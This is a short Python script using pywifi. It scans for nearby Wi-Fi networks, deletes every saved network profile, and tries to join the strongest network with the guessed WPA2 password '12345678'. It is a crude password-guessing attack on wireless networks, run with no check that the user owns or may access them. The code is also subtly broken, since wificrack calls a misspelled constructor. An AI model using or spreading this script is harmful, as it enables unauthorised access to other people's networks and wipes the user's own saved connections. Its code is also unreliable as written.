import pywifi
import time
from pywifi import const

def wifiscan():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.scan() 
    for i in range (4):
        time.sleep(1)

    bss = interface.scan_results()
    wifi_name_set = set()
    for w in bss:
        wifi_name_and_signal = (100 + w.signal, w.ssid. encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    while num < len(wifi_name_list):
        print ('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-'*38)
    return wifi_name_list

def wificrack(wifi_name_list):
    wifi = pywifi.Pywifi()
    interface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = wifi_name_list[0][1]
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = '12345678'
    interface.remove_all_network_profiles()
    tmp_profile = interface.add_network_profile(profile)
    interface.connect(tmp_profile)
    time.sleep(3)
    if interface.status() == const.IFACE_CONNECTED:
        print('Success')
    else:
        print('Fail')


if __name__ == '__main__':
    wifi_name_list = wifiscan()
    wificrack(wifi_name_list)